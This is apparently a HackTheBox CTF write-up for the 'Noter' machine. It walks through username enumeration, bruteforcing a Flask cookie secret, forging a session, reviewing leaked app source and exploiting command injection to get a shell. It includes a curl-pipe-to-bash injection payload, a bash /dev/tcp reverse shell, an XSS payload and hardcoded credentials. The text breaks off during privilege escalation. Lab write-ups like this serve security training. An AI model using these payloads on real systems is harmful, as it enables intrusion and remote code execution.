---
Category:
  - B2R
Difficulty: Medium
Platform: HackTheBox
Status: 3. Complete
tags: [CKEditor, MySQL, MySQL-privesc, RCE, privesc/UDF, authentication-bypass, code-review, command-injection, flask, flask-session-cookie-bruteforce, hardcoded-credentials, insecure-credentials, md-to-pdf, python-coding, user-enumeration, Linux]
---
![Noter.png](../../zzz_res/attachments/Noter.png)

# Resolution summary

>[!summary]
>- The web application used different error messages when trying to login with existing users, allowing to **enumerate usernames** and discover **blue**.
>- The session cookie provided to authenticated users was **signed using a weak secret**. It was possible to **bruteforce** it and **sign arbitrary cookie**, impersonating any existing user (blue)
>- Enumerating **blue’s  notes** it was possible to discover **its credentials** and access **FTP**. Inside its notes it was also possible to discover the **ftp_admin** user
>- Inside FTP a documents containing password policy was discovered and it was possible to **guess ftp_admin credentials.** Accessing FTP as ftp_admin it was possible to discover **two backups of the web application**.
>- **Code review** allowed to identify some **command injection vulnerabilities** contained within the `/export_note_remote` and `/export_note_local/<string:id>`, allowing to execute arbitrary commands and obtain a shell as **svc**
>- Using **hardcoded credentials** from the backup files it was possible to access MySQL with high privileges and exploit **User-Defined Function** (UDF) **Dynamic Library** to elevate privileges to root

## Improved skills

- Bruteforce weak signed cookie in order to sign custom ones
- Review application code to find command injection vulnerabilities
- Exploit UDF Dynamic Library to elevate privileges

## Used tools

- nmap
- gobuster
- ffuf
- custom python code
- ftp
- diff
- public exploit

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Noter]
└─$ sudo nmap -sS -p- 10.129.58.132 -v -oN scan/all-tcp-ports.txt
[sudo] password for kali:
...
Nmap scan report for 10.129.58.132
Host is up (0.042s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.26 seconds
           Raw packets sent: 65675 (2.890MB) | Rcvd: 65539 (2.622MB)
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Noter]
└─$ sudo nmap -sT -sV -sC -p21,22,5000 -oN scan/open-tcp-ports.txt 10.129.58.132
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 08:53 EDT
Nmap scan report for 10.129.58.132
Host is up (0.038s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
```

Enumerated top 200 UDP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Noter]
└─$ sudo nmap -sU --top-ports 200 10.129.58.132
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 08:55 EDT
Nmap scan report for 10.129.58.132
Host is up (0.038s latency).
All 200 scanned ports on 10.129.58.132 are in ignored states.
Not shown: 159 closed udp ports (port-unreach), 41 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 164.86 seconds
```

# Enumeration

## Port 21 - FTP (vsftpd 3.0.3)

No anonymous access

## Port 5000 - HTTP (Werkzeug httpd 2.0.2 (Python 3.8.10))

Browsed port 5000:

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da.png)

Registered a new user:

>[!important]
>0xbro     password

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%201.png)

Enumerated VIP function:

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%202.png)

Enumerated software version:

![CKEditor 4.6.2](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%203.png)

CKEditor 4.6.2

### Stored XSS vulnerability (CVE-2021-33829):

[CVE-2021-33829: Stored XSS Vulnerability Discovered in CKEditor4 Affects Widely-Used CMS](https://checkmarx.com/blog/cve-2021-33829-stored-xss-vulnerability-discovered-in-ckeditor4-affects-widely-used-cms/)

`Xss<!--{cke_protected} --!><img src=1 onerror=alert(`XSS`)>-->Attack`

### User Enumeration

Existing user:

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%204.png)

Non existing user:

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%205.png)

Enumerated existing users:

```bash
┌──(maoutis㉿kali)-[/usr/share/wordlists/seclists]
└─$ ffuf -w /usr/share/seclists/Usernames/cirt-default-usernames.txt  -X POST -d "username=FUZZ&password=xxx" -u http://noter.htb:5000/login -H 'Content-Type: application/x-www-form-urlencoded' -mr "Invalid login"                    2 ⨯

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://noter.htb:5000/login
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/cirt-default-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=xxx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Invalid login
________________________________________________

maoutis                 [Status: 200, Size: 2028, Words: 432, Lines: 69]
blue                    [Status: 200, Size: 2025, Words: 432, Lines: 69]
:: Progress: [829/829] :: Job [1/1] :: 365 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

# Exploitation

## Brute-forcing secret key used to generate cookies:

[flask-cookie-decode](https://pypi.org/project/flask-cookie-decode/)

[GitHub - noraj/flask-session-cookie-manager at d1b17a66850eeeb710c63da762631d38ee3c8dda](https://github.com/noraj/flask-session-cookie-manager/tree/d1b17a66850eeeb710c63da762631d38ee3c8dda)

**bruteforce.py**

```python
#!/usr/bin/env python3
# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast
import string
from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse
import itertools

# external Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key

class FSCM(ABC):

    def decode(session_cookie_value, secret_key):
        """ Decode a Flask cookie  """
        try:
            app = MockApp(secret_key)
            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)
            print(s.loads(session_cookie_value))
            exit()
        except Exception as e:
            return "[Decoding error] {}".format(e)
            raise e

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: bruteforce.py <cookie> <wordlist>")
        exit()

    cookie = sys.argv[1]
    wordlist = sys.argv[2]
    secret_key = ''

    print(f"Bruteforcing cookie {cookie}")
    file = open(wordlist,"r")

    for w in file:
        w = w.rstrip()
        print(f"Testig secret_key {w}")
        print(FSCM.decode(cookie, w))
```

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/Noter/exploit]
└─$ python3 bruteforce.py "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFvdXRpcyJ9.YnzZWg.ywsr97WH9bxrZEwndwUEVuHDiWU" /usr/share/wordlists/rockyou.txt

Bruteforcing cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoibWFvdXRpcyJ9.YnzZWg.ywsr97WH9bxrZEwndwUEVuHDiWU
Testig secret_key 123456
[Decoding error] Signature b'ywsr97WH9bxrZEwndwUEVuHDiWU' does not match
Testig secret_key 12345
[Decoding error] Signature b'ywsr97WH9bxrZEwndwUEVuHDiWU' does not match
Testig secret_key 123456789
[Decoding error] Signature b'ywsr97WH9bxrZEwndwUEVuHDiWU' does not match
Testig secret_key password
[Decoding error] Signature b'ywsr97WH9bxrZEwndwUEVuHDiWU' does not match
...
[Decoding error] Signature b'ywsr97WH9bxrZEwndwUEVuHDiWU' does not match
Testig secret_key secret123
{'logged_in': True, 'username': 'maoutis'}
```

Crafting an arbitrary cookie to impersonate *blue*:

```bash
┌──(maoutis㉿kali)-[~/…/HTB/Noter/exploit/flask-session-cookie-manager]
└─$ python3 flask_session_cookie_manager3.py encode  -s 'secret123' -t "{'logged_in': True, 'username': 'blue'}"
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Ynz37Q.bhsuepbK0pIPjT4j091foqoNesw
```

![New features for VIP users](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%206.png)

New features for VIP users

![blue notes](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%207.png)

blue notes

### Enumerate secret notes

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%208.png)

>[!important]
>blue     blue@Noter!

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%209.png)

### Accessed FTP using leaked credentials

```bash
┌──(maoutis㉿kali)-[~/…/HTB/Noter/exploit/flask-session-cookie-manager]
└─$ ftp noter.htb
Connected to noter.htb.
220 (vsFTPd 3.0.3)
Name (noter.htb:maoutis): blue
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 02 23:05 files
-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf
226 Directory send OK.
ftp> get policy.pdf
```

**policy.pdf**

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%2010.png)

- Tried to access SSH using noter credentials (not working)
    
    ```bash
    ┌──(maoutis㉿kali)-[~/CTF/HTB/Noter/loot]
    └─$ ssh blue@noter.htb
    blue@noter.htb's password:
    Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
    
     System information disabled due to load higher than 2.0
    
     * Super-optimized for small spaces - read how we shrank the memory
       footprint of MicroK8s to make it the smallest full K8s around.
    
       https://ubuntu.com/blog/microk8s-memory-optimisation
    
    157 updates can be applied immediately.
    112 of these updates are standard security updates.
    To see these additional updates run: apt list --upgradable
    
    The list of available updates is more than a week old.
    To check for new updates run: sudo apt update
    
    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    
    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    
    This account is currently not available.
    Connection to noter.htb closed.
```
    
- Tried to access FTP guessing ftp_admin credentials
    
    ```bash
    ┌──(maoutis㉿kali)-[~/CTF/HTB/Noter/loot]
    └─$ ftp noter.htb
    Connected to noter.htb.
    220 (vsFTPd 3.0.3)
    Name (noter.htb:maoutis): ftp_admin
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    -rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
    -rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip
    226 Directory send OK.
    ftp> get app_backup_1635803546.zip
    local: app_backup_1635803546.zip remote: app_backup_1635803546.zip
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).
    226 Transfer complete.
    25559 bytes received in 0.04 secs (667.0219 kB/s)
    ftp> get app_backup_1638395546.zip
    local: app_backup_1638395546.zip remote: app_backup_1638395546.zip
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).
    226 Transfer complete.
    26298 bytes received in 0.04 secs (697.8327 kB/s)
    ```
    
- Enumerated differences between the two zip files:
    
    ```bash
    ┌──(maoutis㉿kali)-[~/CTF/HTB/Noter/loot]
    └─$ diff app_backup_1635803546 app_backup_1638395546 -q -r
    Only in app_backup_1635803546: app_backup_1635803546.zip
    Only in app_backup_1638395546: app_backup_1638395546.zip
    Files app_backup_1635803546/app.py and app_backup_1638395546/app.py differ
    
    ┌──(maoutis㉿kali)-[~/CTF/HTB/Noter/loot]
    └─$ diff app_backup_1635803546/app.py app_backup_1638395546/app.py -y --suppress-common-lines -t                                                                                                                                         1 ⨯
    app.config['MYSQL_USER'] = 'root'                               |  app.config['MYSQL_USER'] = 'DB_user'
    app.config['MYSQL_PASSWORD'] = 'Nildogg36'                      |  app.config['MYSQL_PASSWORD'] = 'DB_password'
                                                                    >  attachment_dir = 'misc/attachments/'
                                                                    >
                                                                    >
                                                                    >  # Export notes
                                                                    >  @app.route('/export_note', methods=['GET', 'POST'])
                                                                    >  @is_logged_in
                                                                    >  def export_note():
                                                                    >      if check_VIP(session['username']):
                                                                    >          try:
                                                                    >              cur = mysql.connection.cursor()
                                                                    >
                                                                    >              # Get note
                                                                    >              result = cur.execute("SELECT * FROM notes WHERE aut
                                                                    >
                                                                    >              notes = cur.fetchall()
                                                                    >
                                                                    >              if result > 0:
                                                                    >                  return render_template('export_note.html', note
                                                                    >              else:
                                                                    >                  msg = 'No notes Found'
                                                                    >                  return render_template('export_note.html', msg=
                                                                    >              # Close connection
                                                                    >              cur.close()
                                                                    >
                                                                    >          except Exception as e:
                                                                    >              return render_template('export_note.html', error="A
                                                                    >
                                                                    >      else:
                                                                    >          abort(403)
                                                                    >
                                                                    >  # Export local
                                                                    >  @app.route('/export_note_local/<string:id>', methods=['GET'])
                                                                    >  @is_logged_in
                                                                    >  def export_note_local(id):
                                                                    >      if check_VIP(session['username']):
                                                                    >
                                                                    >          cur = mysql.connection.cursor()
                                                                    >
                                                                    >          result = cur.execute("SELECT * FROM notes WHERE id = %s
                                                                    >
                                                                    >          if result > 0:
                                                                    >              note = cur.fetchone()
                                                                    >
                                                                    >              rand_int = random.randint(1,10000)
                                                                    >              command = f"node misc/md-to-pdf.js  $'{note['body']
                                                                    >              subprocess.run(command, shell=True, executable="/bi
                                                                    >
                                                                    >              return send_file(attachment_dir + str(rand_int) +'.
                                                                    >
                                                                    >          else:
                                                                    >              return render_template('dashboard.html')
                                                                    >      else:
                                                                    >          abort(403)
                                                                    >
                                                                    >  # Export remote
                                                                    >  @app.route('/export_note_remote', methods=['POST'])
                                                                    >  @is_logged_in
                                                                    >  def export_note_remote():
                                                                    >      if check_VIP(session['username']):
                                                                    >          try:
                                                                    >              url = request.form['url']
                                                                    >
                                                                    >              status, error = parse_url(url)
                                                                    >
                                                                    >              if (status is True) and (error is None):
                                                                    >                  try:
                                                                    >                      r = pyrequest.get(url,allow_redirects=True)
                                                                    >                      rand_int = random.randint(1,10000)
                                                                    >                      command = f"node misc/md-to-pdf.js  $'{r.te
                                                                    >                      subprocess.run(command, shell=True, executa
                                                                    >
                                                                    >                      if os.path.isfile(attachment_dir + f'{str(r
                                                                    >
                                                                    >                          return send_file(attachment_dir + f'{st
                                                                    >
                                                                    >                      else:
                                                                    >                          return render_template('export_note.htm
                                                                    >
                                                                    >                  except Exception as e:
                                                                    >                      return render_template('export_note.html',
                                                                    >
                                                                    >
                                                                    >              else:
                                                                    >                  return render_template('export_note.html', erro
                                                                    >
                                                                    >          except Exception as e:
                                                                    >              return render_template('export_note.html', error=f"
                                                                    >
                                                                    >      else:
                                                                    >          abort(403)
                                                                    >
                                                                    >  # Import notes
                                                                    >  @app.route('/import_note', methods=['GET', 'POST'])
                                                                    >  @is_logged_in
                                                                    >  def import_note():
                                                                    >
                                                                    >      if check_VIP(session['username']):
                                                                    >          if request.method == 'GET':
                                                                    >              return render_template('import_note.html')
                                                                    >
                                                                    >          elif request.method == "POST":
                                                                    >              title = request.form['title']
                                                                    >              url = request.form['url']
                                                                    >
                                                                    >              status, error = parse_url(url)
                                                                    >
                                                                    >              if (status is True) and (error is None):
                                                                    >                  try:
                                                                    >                      r = pyrequest.get(url,allow_redirects=True)
                                                                    >                      md = "\n\n".join(r.text.split("\n")[:])
                                                                    >
                                                                    >                      body = markdown.markdown(md)
                                                                    >                      cur = mysql.connection.cursor()
                                                                    >                      cur.execute("INSERT INTO notes(title, body,
                                                                    >                      mysql.connection.commit()
                                                                    >                      cur.close()
                                                                    >
                                                                    >                      return render_template('import_note.html',
                                                                    >
                                                                    >
                                                                    >                  except Exception as e:
                                                                    >                      return render_template('import_note.html',
                                                                    >
                                                                    >              else:
                                                                    >                  return render_template('import_note.html', erro
                                                                    >
                                                                    >      else:
                                                                    >          abort(403)
                                                                    >
```
    
- Enumerated **app.py**
    
    ```python
    #!/usr/bin/python3
    from flask import Flask, render_template, flash, redirect, url_for, abort, session, request, logging, send_file
    from flask_mysqldb import MySQL
    from wtforms import Form, StringField, TextAreaField, PasswordField, validators
    from passlib.hash import sha256_crypt
    from functools import wraps
    import time
    import requests as pyrequest
    from html2text import html2text
    import markdown
    import random, os, subprocess
    
    app = Flask(__name__)
    
    # Config MySQL
    app.config['MYSQL_HOST'] = 'localhost'
    app.config['MYSQL_USER'] = 'DB_user'
    app.config['MYSQL_PASSWORD'] = 'DB_password'
    app.config['MYSQL_DB'] = 'app'
    app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
    
    attachment_dir = 'misc/attachments/'
    
    # init MYSQL
    mysql = MySQL(app)
    
    # Index
    @app.route('/')
    def index():
        return render_template('home.html')
    
    # About
    @app.route('/about')
    def about():
        return render_template('about.html')
    
    # Check if user logged in
    def is_logged_in(f):
        @wraps(f)
        def wrap(*args, **kwargs):
            if 'logged_in' in session:
                return f(*args, **kwargs)
            else:
                flash('Unauthorized, Please login', 'danger')
                return redirect(url_for('login'))
        return wrap
    
    # notes
    @app.route('/notes')
    @is_logged_in
    def notes():
        # Create cursor
        cur = mysql.connection.cursor()
        # Get notes
        if check_VIP(session['username']):
            result = cur.execute("SELECT * FROM notes where author= (%s or 'Noter Team')",[session['username']])
        else:
            result = cur.execute("SELECT * FROM notes where author= %s",[session['username']])
    
        notes = cur.fetchall()
    
        if result > 0:
            return render_template('notes.html', notes=notes)
        else:
            msg = 'No notes Found'
            return render_template('notes.html', msg=msg)
        # Close connection
        cur.close()
    
    #Single note
    @app.route('/note/<string:id>/')
    @is_logged_in
    def note(id):
        # Create cursor
        cur = mysql.connection.cursor()
    
        # Get notes
        if check_VIP(session['username']):
            result = cur.execute("SELECT * FROM notes where author= (%s or 'Noter Team') and id = %s",(session['username'], id))
        else:
            result = cur.execute("SELECT * FROM notes where author= %s",[session['username']])
    
        note = cur.fetchone()
        note['body'] = html2text(note['body'])
        return render_template('note.html', note=note)
    
    # Register Form Class
    class RegisterForm(Form):
        name = StringField('Name', [validators.Length(min=1, max=50)])
        username = StringField('Username', [validators.Length(min=3, max=25)])
        email = StringField('Email', [validators.Length(min=6, max=50)])
        password = PasswordField('Password', [
            validators.DataRequired(),
            validators.EqualTo('confirm', message='Passwords do not match')
        ])
        confirm = PasswordField('Confirm Password')
    
    # User Register
    @app.route('/register', methods=['GET', 'POST'])
    def register():
        form = RegisterForm(request.form)
        if request.method == 'POST' and form.validate():
            name = form.name.data
            email = form.email.data
            username = form.username.data
            password = sha256_crypt.encrypt(str(form.password.data))
    
            # Create cursor
            cur = mysql.connection.cursor()
    
            # Execute query
            cur.execute("INSERT INTO users(name, email, username, password) VALUES(%s, %s, %s, %s)", (name, email, username, password))
    
            # Commit to DB
            mysql.connection.commit()
    
            # Close connection
            cur.close()
    
            flash('You are now registered and can log in', 'success')
    
            return redirect(url_for('login'))
        return render_template('register.html', form=form)
    
    # User login
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        if request.method == 'POST':
            # Get Form Fields
            username = request.form['username']
            password_candidate = request.form['password']
    
            # Create cursor
            cur = mysql.connection.cursor()
    
            # Get user by username
            result = cur.execute("SELECT * FROM users WHERE username = %s", ([username]))
    
            if result > 0:
                # Get stored hash
                data = cur.fetchone()
                password = data['password']
    
                # Compare Passwords
                if sha256_crypt.verify(password_candidate, password):
                    # Passed
                    session['logged_in'] = True
                    session['username'] = username
    
                    flash('You are now logged in', 'success')
                    return redirect(url_for('dashboard'))
                else:
                    error = 'Invalid login'
                    return render_template('login.html', error=error)
                # Close connection
                cur.close()
            else:
                error = 'Invalid credentials'
                return render_template('login.html', error=error)
    
        return render_template('login.html')
    
    # Logout
    @app.route('/logout')
    @is_logged_in
    def logout():
        session.clear()
        flash('You are now logged out', 'success')
        return redirect(url_for('login'))
    
    #Check VIP
    def check_VIP(username):
        try:
            cur = mysql.connection.cursor()
            results = cur.execute(""" select username, case when role = "VIP" then True else False end as VIP from users where username = %s """, [username])
    
            results = cur.fetchone()
            cur.close()
    
            if len(results) > 0:
                if results['VIP'] == 1:
                    return True
    
            return False
    
        except Exception as e:
            return render_template('login.html')
    
    # Dashboard
    @app.route('/dashboard')
    @is_logged_in
    def dashboard():
    
        # Create cursor
        cur = mysql.connection.cursor()
    
        # Get notes
        #result = cur.execute("SELECT * FROM notes")
        # Show notes only from the user logged in 
        result = cur.execute("SELECT * FROM notes WHERE author = %s",[session['username']])
    
        notes = cur.fetchall()
        VIP = check_VIP(session['username'])
    
        if result > 0:
            if VIP:
                return render_template('vip_dashboard.html', notes=notes)
    
            return render_template('dashboard.html', notes=notes)
        
        else:
            msg = 'No notes Found'
    
            if VIP:
                return render_template('vip_dashboard.html', msg=msg)
    
            return render_template('dashboard.html', msg=msg)
        # Close connection
        cur.close()
    
    # parse the URL
    def parse_url(url):
        url = url.lower()
        if not url.startswith ("http://" or "https://"):
            return False, "Invalid URL"    
    
        if not url.endswith('.md'):
                return False, "Invalid file type"
    
        return True, None
    
    # Export notes
    @app.route('/export_note', methods=['GET', 'POST'])
    @is_logged_in
    def export_note():
        if check_VIP(session['username']):
            try:
                cur = mysql.connection.cursor()
    
                # Get note
                result = cur.execute("SELECT * FROM notes WHERE author = %s", ([session['username']]))
    
                notes = cur.fetchall()
    
                if result > 0:
                    return render_template('export_note.html', notes=notes)
                else:
                    msg = 'No notes Found'
                    return render_template('export_note.html', msg=msg)
                # Close connection
                cur.close()
                    
            except Exception as e:
                return render_template('export_note.html', error="An error occured!")
    
        else:
            abort(403)
    
    # Export local
    @app.route('/export_note_local/<string:id>', methods=['GET'])
    @is_logged_in
    def export_note_local(id):
        if check_VIP(session['username']):
    
            cur = mysql.connection.cursor()
    
            result = cur.execute("SELECT * FROM notes WHERE id = %s and author = %s", (id,session['username']))
    
            if result > 0:
                note = cur.fetchone()
    
                rand_int = random.randint(1,10000)
                command = f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"
                subprocess.run(command, shell=True, executable="/bin/bash")
            
                return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)
    
            else:
                return render_template('dashboard.html')
        else:
            abort(403)
    
    # Export remote
    @app.route('/export_note_remote', methods=['POST'])
    @is_logged_in
    def export_note_remote():
        if check_VIP(session['username']):
            try:
                url = request.form['url']
    
                status, error = parse_url(url)
    
                if (status is True) and (error is None):
                    try:
                        r = pyrequest.get(url,allow_redirects=True)
                        rand_int = random.randint(1,10000)
                        command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                        subprocess.run(command, shell=True, executable="/bin/bash")
    
                        if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):
    
                            return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)
    
                        else:
                            return render_template('export_note.html', error="Error occured while exporting the !")
    
                    except Exception as e:
                        return render_template('export_note.html', error="Error occured!")
    
                else:
                    return render_template('export_note.html', error=f"Error occured while exporting ! ({error})")
                
            except Exception as e:
                return render_template('export_note.html', error=f"Error occured while exporting ! ({e})")
    
        else:
            abort(403)
    
    # Import notes
    @app.route('/import_note', methods=['GET', 'POST'])
    @is_logged_in
    def import_note():
    
        if check_VIP(session['username']):
            if request.method == 'GET':
                return render_template('import_note.html')
    
            elif request.method == "POST":
                title = request.form['title']
                url = request.form['url']
    
                status, error = parse_url(url)
    
                if (status is True) and (error is None):
                    try:
                        r = pyrequest.get(url,allow_redirects=True)
                        md = "\n\n".join(r.text.split("\n")[:])
    
                        body = markdown.markdown(md)
                        cur = mysql.connection.cursor()
                        cur.execute("INSERT INTO notes(title, body, author, create_date ) VALUES  (%s, %s, %s ,%s) ", (title, body[:900], session['username'], time.ctime()))
                        mysql.connection.commit()
                        cur.close()
    
                        return render_template('import_note.html', msg="Note imported successfully!")
    
                    
                    except Exception as e:
                        return render_template('import_note.html', error="An error occured when importing!")
    
                else:
                    return render_template('import_note.html', error=f"An error occured when importing! ({error})")
    
        else:
            abort(403)
    
    # upgrade to VIP
    @app.route('/VIP',methods=['GET'])
    @is_logged_in
    def upgrade():
        return render_template('upgrade.html')
    
    # note Form Class
    class NoteForm(Form):
        title = StringField('Title', [validators.Length(min=1, max=200)])
        body = TextAreaField('Body', [validators.Length(min=30)])
    
    # Add note
    @app.route('/add_note', methods=['GET', 'POST'])
    @is_logged_in
    def add_note():
        form = NoteForm(request.form)
        if request.method == 'POST' and form.validate():
            title = form.title.data
            body = form.body.data
            # Create Cursor
            cur = mysql.connection.cursor()
    
            # Execute
            cur.execute("INSERT INTO notes(title, body, author,create_date ) VALUES(%s, %s, %s, %s)",(title, body, session['username'], time.ctime()))
    
            # Commit to DB
            mysql.connection.commit()
    
            #Close connection
            cur.close()
    
            flash('note Created', 'success')
    
            return redirect(url_for('dashboard'))
    
        return render_template('add_note.html', form=form)
    
    # Edit note
    @app.route('/edit_note/<int:id>', methods=['GET', 'POST'])
    @is_logged_in
    def edit_note(id):
        # Create cursor
        cur = mysql.connection.cursor()
    
        # Get note by id
        result = cur.execute("SELECT * FROM notes WHERE id = %s AND author = %s", (id, session['username']))
    
        note = cur.fetchone()
        cur.close()
        # Get form
        form = NoteForm(request.form)
    
        # Populate note form fields
        form.title.data = note['title']
        form.body.data = note['body']
    
        if request.method == 'POST' and form.validate():
            title = request.form['title']
            body = request.form['body']
    
            # Create Cursor
            cur = mysql.connection.cursor()
            app.logger.info(title)
            # Execute
            cur.execute ("UPDATE notes SET title=%s, body=%s WHERE id=%s  AND author = %s",(title, body, id, session['username']))
            # Commit to DB
            mysql.connection.commit()
    
            #Close connection
            cur.close()
    
            flash('note Updated', 'success')
    
            return redirect(url_for('dashboard'))
    
        return render_template('edit_note.html', form=form)
    
    # Delete note
    @app.route('/delete_note/<int:id>', methods=['POST'])
    @is_logged_in
    def delete_note(id):
        # Create cursor
        cur = mysql.connection.cursor()
    
        # Execute
        cur.execute("DELETE FROM notes WHERE id = %s AND author= %s",(id, session['username']))
    
        # Commit to DB
        mysql.connection.commit()
    
        #Close connection
        cur.close()
    
        flash('Note deleted', 'success')
    
        return redirect(url_for('dashboard'))
    
    if __name__ == '__main__':
        app.secret_key='secret123'
        app.run(host="0.0.0.0",debug=False)
    ```
    

## Arbitrary Code Injection

**app.py** used user controllable input (from already created notes or through arbitrary external resources) to build a system command. It is possible to inject arbitrary code in order to affect the expected behavior of the software.

```python
@app.route('/export_note_local/<string:id>', methods=['GET'])
@is_logged_in
def export_note_local(id):
    if check_VIP(session['username']):
        cur = mysql.connection.cursor()
        result = cur.execute("SELECT * FROM notes WHERE id = %s and author = %s", (id,session['username']))
        if result > 0:
            note = cur.fetchone()
            rand_int = random.randint(1,10000)
            command = f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"
            subprocess.run(command, shell=True, executable="/bin/bash")
            return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)
        ...

# Export remote
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
    if check_VIP(session['username']):
        try:
            url = request.form['url']
            status, error = parse_url(url)
            if (status is True) and (error is None):
                try:
                    r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                    subprocess.run(command, shell=True, executable="/bin/bash")
                    if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):
                        return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)
                   ...
```

```bash
';curl http://10.10.14.3/rev.sh|/bin/bash;'
```

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/10099 0>&1'
```

![Noter%20437229356783424b983d4b58dfa942da](../../zzz_res/attachments/Noter%20437229356783424b983d4b58dfa942da%2011.png)

# Privilege Escalation

## Local enumeration

Enumerated local users:

```bash
svc@noter:~$ cat /etc/passwd | grep 'sh'
root:x:0:0:root:/root:/bin/bash
